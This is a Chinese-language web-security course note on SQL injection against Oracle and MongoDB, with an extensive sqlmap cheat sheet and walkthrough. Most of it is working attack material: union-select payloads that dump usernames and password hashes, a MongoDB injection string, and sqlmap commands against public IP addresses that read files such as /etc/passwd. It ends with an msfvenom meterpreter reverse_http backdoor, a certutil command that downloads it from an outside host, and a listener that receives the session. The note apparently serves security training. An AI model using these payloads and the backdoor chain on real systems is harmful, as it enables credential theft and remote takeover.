![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195635-18b1866c-3cf9-439f-bc14-a6c5fce3011b.png)

```plain
#知识点：
1、数据库注入-Oracle&Mongodb
2、数据库注入-DB2&SQLite&Sybase
3、SQL注入神器-SQLMAP安装使用拓展

#SQLMAP
-什么是SQLMAP？
-它支持那些数据库注入？
-它支持那些SQL注入模式？sqlmap不支持nosql注入
-它支持那些其他不一样功能？
-使用SQLMAP一般注入流程分析？

#SQL注入课程体系：
1.数据库注入    - access mysql mssql oracle mongodb postgresql等
2.数据类型注入 - 数字型 字符型 搜索型 加密型(base64 json)等
3.提交方式注入 - get post cookie http头等 
4.查询方式注入 - 查询 增加 删除 更新 堆叠等
5.复杂注入利用 - 二次注入 dnslog注入 绕过bypass等
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135201802-81479e9f-ee95-4d8f-bb8c-d4479e8a1379.png)

------

- 数据库注入-联合猜解-Oracle&Mongodb
- Oracle

```plain
参考文章：https://www.cnblogs.com/peterpan0707007/p/8242119.html
测字段：order by 2
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195029-a0f81ac3-52ca-49a1-bff1-bd2402238b89.png)

爆数字：union select '1','2' from dual

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135194916-660d2b88-7522-4833-93ce-f54cf59b19a2.png)

```plain
爆表：and 1=2 union select '1',(select table_name from user_tables where rownum=1) from dual
记录表名字：LOGMNR_SESSION_EVOLVE$
但是这样查询过于复杂，不适用，所以有下面的模糊爆库
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135194925-bf8759c6-ab27-4583-870b-f22839215446.png)

```plain
模糊爆表：and 1=2 union select '1',(select table_name from user_tables where rownum=1 and table_name like '%user%') from dual
记录表名：sns_users
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195293-49a5d365-82c9-401b-9c53-e4559d28db03.png)

```plain
爆列名：and 1=2 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users') from dual
爆其他列名：and 1=2 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users' and column_name not in ('USER_NAME')) from dual
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195356-3608e967-79c2-40c2-8de0-7db307fc9fe4.png)

```plain
爆数据：and 1=2 union select user_name,user_pwd from "sns_users"
爆其他数据：and 1=2 union select user_name,user_pwd from "sns_users" where USER_NAME<>'hu'
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195455-a844d004-0116-4f55-b955-6464db53c0ad.png)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195602-7dbfcc35-caee-4a18-bf8a-3d4454b31c5a.png)

经过md5解密，得到账号密码，登录，得到key,完成测试。

Mongodb

```plain
参考：https://www.runoob.com/mongodb/mongodb-query.html
这类型的数据库在python用的比较多。
启动靶场，发现关键性代码：
$query="var data=db.notice.findOne({'id':'$id'});return data;";这个是SQL执行语句，如果没有关键性代码，那么我们很难闭合这个符号，很难去猜解账号密码。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135196392-3c3a4abd-202f-49cf-8acd-ffa87248c4e1.png)

```plain
如何构造payload？
正常写法：select * from news where id=1
mdb数据库写法：select * from news where id={('$id')}，需要闭合符号

原始语句：db.notice.findOne({'id':'$id'});return data;
如果 ?id=1 order by 2
那么语句就会变成：db.notice.findOne({'id':‘1 order by 2’});return data;，语句不正确。
但是注入语句 ?id=1'}); return ({title:tojson(db),content:'1
那么语句就变成：db.notice.findOne({'id':‘1'}); return ({title:tojson(db),content:'1'});return data; ，就可以进行正常的注入。
```

测回显：/new_list.php?id=1'}); return ({title:1,content:'2

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195725-ae125df4-a8d9-4218-b49c-f34033576c71.png)

```plain
爆库：  /new_list.php?id=1'}); return ({title:tojson(db),content:'1
记录数据库：mozhe_cms_Authority
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195882-b1f2a77c-2b32-4e2b-8229-05a65db67c48.png)

```plain
爆表： /new_list.php?id=1'}); return ({title:tojson(db.getCollectionNames()),content:'1  
db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。
记录表名："Authority_confidential", "notice", "system.indexes"
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195947-53e15488-d2b1-4c1c-806a-350985ea59c9.png)

```plain
爆字段：/new_list.php?id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1
db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135195999-2cb66854-b08d-4178-aabe-c6cdbd529c7a.png)

------

- 数据库注入-SQLMAP-DB2&SQLite&Sybase

基本上数据库都差不多的，所有本次用到Oracle数据库作为实验。有一些数据库SQLmap不支持，比如nosql等。

```plain
测试注入点：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1"
测试的结果保存在：C:\Users\我是正经人z\AppData\Local\sqlmap\output\219.153.49.228
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135196326-80363729-cd0e-4b7e-a96b-6883f71a582d.png)

```plain
SQLmap使用步骤：
1、判断数据库注入点
2、判断注入点权限


#SQLMAP使用参数：
参考：https://www.cnblogs.com/bmjoker/p/9326258.html
基本操作笔记：-u  #注入点 
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 


常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"


简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
执行：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --privileges
这种比较难判断是不是管理员权限。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135196335-0a4c9b9d-6a24-40c0-b39f-86c8a3344485.png)

```plain
判断是否为最高权限：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --is-dba
这种判断是不是最高权限最好的方法。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135196413-47282559-df41-4312-a62d-9587714c8252.png)

爆库(获取所有的数据库)：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --dbs

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135196631-b003f3c3-a2c7-49b3-87bc-c6bb2d895bbd.png)

获取当前数据库：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --current-db

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135196775-418416f5-702b-412c-abd0-3c4573eb08cf.png)

获取指定的数据库的表：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --tables -D "SYSTEM"

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135197407-2fbbee44-51bd-49df-818b-87b727ea6ad5.png)

获取指定数据库下表名的字段：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --columns -T "NOTICE"  -D "SYSTEM"

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135197457-a0589749-9366-43fa-a7bc-b32a6ba24bce.png)

获取数据：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --dump -C	"列名" -T "表名"如果出现不同数据库相同的网站，那么就会有缓存，清除缓存：python310 sqlmap.py -u "http://219.153.49.228:40042/new_list.php?id=1" --purge

------

- 数据库注入-SQLMAP-数据猜解&高权限读写执行

高权限读写执行

```plain
如果用数据包去进行测试，那么需要在数据包上注入点中加上*号，然后用到-r 参数进行测试。（数据包保存为文本文件）
测试目标：47.94.200.108:888
抓取登录框数据包
POST /Login/ValidateLogin HTTP/1.1
Host: 47.94.200.108:888
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://47.94.200.108:888/Login/index
Content-Length: 32
Cookie: Hm_lvt_8ee3ec23e73c6dcda2c7c9c489c151aa=1645057307; Hm_lpvt_8ee3ec23e73c6dcda2c7c9c489c151aa=1645057307
DNT: 1
Connection: close

userName=admin&password=12456789

在SQLmap运行目录生成1.txt文件，保存数据包
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135197446-f8d8817d-dfd8-45b4-89cd-8ad45b1b5901.png)

```plain
执行：python310 sqlmap.py -r 1.txt
但是最后测试没有注入点
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135197185-e2340d86-12db-462b-9255-8021105e8dc4.png)

但是经过手工测试，证明注入点还有。在admin下面加上'来进行测试。但是最后测试还是没有注入点。

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135197647-e7b65b5e-9fbc-4ced-ad42-0469963f42ef.png)

```plain
查看权限：python310 sqlmap.py -r 1.txt --is-dba
执行命令(交互式)：python310 sqlmap.py -r 1.txt --os-shell
本次用本地案例来进行代替。
本地联动msf
则python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1"
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135198336-da548c84-ce99-4068-a52d-8de7617a5828.png)

判断高权限：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --is-dba

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135198225-e03ca924-f5bf-4df8-bd6b-f9c54e5c38d7.png)

进行命令执行：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --os-shell

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135198128-446da317-f7d4-41a0-9ba7-5b96c14b31d2.png)

在msf中生成一个后门： msfvenom -p windows/meterpreter/reverse_http lhost=47.100.167.248 lport=1111 -f exe -o sql.exe

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135198194-5273e68d-a8c8-4994-b866-93c8209ec9c3.png)

```plain
放在阿里云网站目录上，访问www.mumuxi8.com/sql.exe进行下载。这里我们远程执行命令，利用命令行下载：certutil.exe -urlcache -split -f http://www.mumuxi8.com:80/sql.exe d:/sql.exe
msf监听1111端口：
use exploit/multi/handler 
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 1111
run
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135198420-84571ada-dad7-4fa3-a751-8bd1c3f09c0c.png)

```plain
用到高权限SQL注入进行文件读取：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --file-read "d:/w.txt"
读取的结果保存在了文件中。路径：C:\Users\我是正经人z\AppData\Local\sqlmap\output\127.0.0.1\files
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135198886-23085e56-59f9-4024-b852-b0d8fc4ae058.png)

```plain
写入文件：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --file-write "d:/w.txt" --file-dest "d:/1.txt" 
w.txt是要写的文件（本地），1.txt是后门文件（远程）
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135198723-aa93adae-c673-4d63-8582-3585097b9b4a.png)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135198905-683343e7-27ae-4702-b2cf-ec12f5e6804e.png)

命令执行：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --os-cmd="certutil.exe -urlcache -split -f http://www.mumuxi8.com:80/sql.exe d:/sql.exe"

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135199228-2bd87b2c-79c3-4c5b-a0ba-c6872b74cd08.png)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135199018-94e8e0f1-6865-422e-a3d4-99fe97f3aadc.png)

```plain
命令执行，执行后门代码上线：python310 sqlmap.py -u "http://127.0.0.1:8081/web/mysql/news.php?id=1" --os-cmd="d:/sql.exe"
执行成功，收到会话。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135199225-a5bbc842-5a68-47a8-bd27-58e3e7131d19.png)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135199259-c39e14cb-b162-4136-9242-83e9d93f0d7f.png)



来自: [安全的小菜鸡 - 第26天：Web攻防-通用漏洞&SQL注入&Sqlmap&Oracle&Mongodb&DB2等](http://www.mumuxi8.com/?id=56)